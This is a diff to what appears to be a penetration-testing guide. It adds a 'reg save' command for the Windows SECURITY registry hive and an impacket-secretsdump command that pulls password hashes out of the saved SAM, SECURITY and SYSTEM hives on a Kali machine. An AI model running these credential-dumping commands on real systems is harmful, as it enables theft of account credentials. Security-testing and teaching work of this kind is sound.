@@ -135,12 +135,14 @@ The easiest way to steal those files is to get a copy from the registry:
 ```text
 reg save HKLM\sam sam
 reg save HKLM\system system
+reg save HKLM\security security
 ```
 
 **Download** those files to your Kali machine and **extract the hashes** using:
 
 ```text
 samdump2 SYSTEM SAM
+impacket-secretsdump -sam sam -security security -system system LOCAL
 ```
 
 ### Volume Shadow Copy
